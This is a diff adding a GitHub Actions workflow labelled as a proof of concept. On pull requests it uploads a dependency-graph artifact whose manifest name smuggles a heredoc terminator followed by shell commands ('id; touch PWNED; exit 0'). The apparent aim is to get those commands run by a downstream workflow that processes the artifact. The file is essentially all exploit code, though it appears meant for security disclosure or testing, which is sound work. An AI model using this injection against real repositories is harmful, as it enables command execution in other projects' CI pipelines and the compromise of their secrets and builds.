@@ -1,0 +1,36 @@
+name: PR Workflow
+
+on:
+  pull_request:
+
+jobs:
+  depgraph:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create attacker-controlled dependency graph artifact
+        run: |
+          mkdir -p out
+          python3 - <<'PY'
+          import json
+          snap = {
+            "version": 0,
+            "sha": "${{ github.event.pull_request.head.sha }}",
+            "ref": "refs/pull/${{ github.event.pull_request.number }}/head",
+            "job": {"correlator": "poc", "id": "poc-1"},
+            "detector": {"name": "poc", "version": "1.0", "url": "https://example.com"},
+            "manifests": {
+              "attacker-manifest\nEOF\nid; touch PWNED; exit 0\n": {
+                "name": "attacker-manifest",
+                "file": {"source_location": "attacker-manifest"},
+                "resolved": {}
+              }
+            },
+            "scanned": {"version": 0}
+          }
+          open("out/dep.json","w").write(json.dumps(snap))
+          PY
+          cat out/dep.json
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dependency-graph_poc
+          path: out/
